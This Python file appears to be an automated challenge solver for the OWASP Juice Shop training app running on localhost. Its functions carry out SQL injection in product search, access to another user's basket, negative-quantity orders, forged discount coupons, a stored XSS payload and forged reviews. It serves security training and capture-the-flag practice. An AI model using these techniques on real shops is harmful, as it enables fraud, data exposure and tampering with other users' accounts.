import json
import datetime

from zmq.utils import z85

from authentication import get_admin_session
from authentication import get_current_user_id


def _get_basket_url(server):
    return '{}/rest/basket'.format(server)


def _build_basket_payload(productid, basketid, quantity):
    return json.dumps({'ProductId': productid, 'BasketId': basketid, 'quantity': quantity})


def search_products(server, session, searchterm=''):
    search = session.get('{}/rest/products/search?q={}'.format(server, searchterm))
    if not search.ok:
        print('Error searching products: {}'.format(search.reason))
    return search.json().get('data')


def access_another_user_basket(server, session):
    """
    If we're admin(ID 1), open basket 2. Anybody else, open the ID below us.
    :param server: juice shop URL
    :param session: Session
    """
    try:
      print("Access another user basket...", end="")
      myid = get_current_user_id(server, session)
      if myid is 1:
          targetid = myid + 1
      else:
          targetid = myid - 1
      basket = session.get('{}/{}'.format(_get_basket_url(server), targetid))
      if not basket.ok:
          print('Error accessing basket {}'.format(targetid))
      else:
          print('Success.')
    except:
      print('Failed!')


def order_christmas_special(server, session):
    """
    Find the 2014 Christmas special with a SQLi, add it to our basket and checkout
    :param server: juice shop URL
    :param session: Session
    """
    products = search_products(server, session, "christmas%25'))--")
    for product in products:
        if 'Christmas' in product.get('name'):
            basketid = get_current_user_id(server, session)
            payload = _build_basket_payload(product.get('id'), basketid, 1)
            print("DEBUG: ", payload)
            _add_to_basket(server, session, payload)
            _checkout(server, session, basketid)


def make_ourselves_rich(server, session):
    """
    Ordering a negative number of hoodies and checking out should give us plenty of imaginary money.
    :param server: juice shop URL
    :param session: Session
    """
    print('Adding negative items to basket...', end=""),
    basketid = get_current_user_id(server, session)
    payload = json.dumps({"quantity":-100})
    basketurl = '{}/api/BasketItems/1'.format(server)
    additem = session.put(basketurl, data=payload)
    if not additem.ok:
        print('Error adding items to basket.')
    else:
      print('Success.')
    _checkout(server, session, basketid)


def update_osaft_description(server, session):
    """
    Replace the O-Saft product link with our own.
    :param server: juice shop URL
    :param session: Session
    """
    try:
      print('Updating O-Saft description with new URL...', end=""),
      origurl = 'http://kimminich.de'
      newurl = 'https://owasp.slack.com'
      osaft = search_products(server, session, searchterm='O-Saft')[0]
      description = osaft.get('description').replace(origurl, newurl)
      _update_description(server, session, productid=osaft.get('id'), description=description)
      print('Success.')
    except:
      print('Failed!')


def update_product_with_xss3_payload(server, session):
    xss3 = '<script>alert("XSS3")</script>'
    print('Updating a production description with XSS3 payload...'),
    _update_description(server, session, 1, xss3)
    # Change it to something harmless
    _update_description(server, session, 1, 'RIP.')
    print('Success.')


def forge_coupon(server):
    """
    Force a 99%-off coupon and checkout
    :param server: juice shop URL
    """
    session = get_admin_session(server)
    basketid = get_current_user_id(server, session)
    payload = _build_basket_payload(2, basketid, 1)
    _add_to_basket(server, session, payload)
    couponcode = _generate_coupon()
    print('Applying forged coupon...'),
    applycoupon = session.put('{}/{}/coupon/{}'.format(_get_basket_url(server), basketid, couponcode))
    if not applycoupon.ok:
        print('Error applying coupon code.')
    _checkout(server, session, basketid)
    print('Success.')


def _update_description(server, session, productid, description):
    """
    Update the description of a given product ID
    :param server: juice shop URL
    :param session: Session
    :param productid: ID # of target product
    :param description: text to overwrite existing description with
    """
    apiurl = '{}/api/Products/{}'.format(server, productid)
    payload = json.dumps({'description': description})
    update = session.put(apiurl, headers={'Content-Type': 'application/json'}, data=payload)
    if not update.ok:
        print('Error updating description for product.')


def _add_to_basket(server, session, payload):
    """
    Add items to basket
    :param server: juice shop URL
    :param session: Session
    :param payload: dict of ProductId, BasketId and quantity to add
    """
    basketurl = '{}/api/BasketItems/'.format(server)
    additem = session.post(basketurl, data=payload)
    # additem = session.post(basketurl, headers={'Content-Type': 'application/json'}, data=payload)
    if not additem.ok:
        print('Error adding items to basket.')


def _checkout(server, session, basketid):
    """
    Checkout current basket
    :param server: juice shop URL
    :param session: Session
    """
    payload = json.dumps({'couponData':'bnVsbA==','orderDetails':{'paymentId':'3','addressId':'3','deliveryMethodId':'1'}})
    checkout = session.post('{}/{}/checkout'.format(_get_basket_url(server), basketid), payload)
    if not checkout.ok:
        print('Error checking out basket.')

def _generate_coupon():
    """
    Generate coupon using current month/year
    :return: 
    """
    now = datetime.datetime.now()
    month = now.strftime('%b').upper()
    year = now.strftime('%y')
    return z85.encode('{month}{year}-99'.format(month=month, year=year))

def forged_review_challenge(server, session):
    """
    Post a product review as another user or edit any user's existing review.
    :param server: juice shop URL
    :param session: Session
    """
    try:
      print('Posting a product review as another user....'),
      session = get_admin_session(server)
      payload = json.dumps({"message":"This may be the end of the banana daiquiri as we know it!","author":"bender@juice-sh.op"})
      review = session.put('{}/rest/products/6/reviews'.format(server), payload)
      if not review.ok:
          print('Error checking out basket.')
      print('Success.')
    except:
      print('Failed!')
        


def solve_product_challenges(server):
    print('\n== PRODUCT CHALLENGES ==\n')
    session = get_admin_session(server)
    access_another_user_basket(server, session)
    #order_christmas_special(server, session)
    #make_ourselves_rich(server, session)
    update_osaft_description(server, session)
    #update_product_with_xss3_payload(server, session)
    #forge_coupon(server)
    forged_review_challenge(server, session)
    print('\n== PRODUCT CHALLENGES COMPLETE ==\n')

if __name__ == '__main__':
    server = 'http://localhost:3000'
    session = get_admin_session(server)
    order_christmas_special(server, session)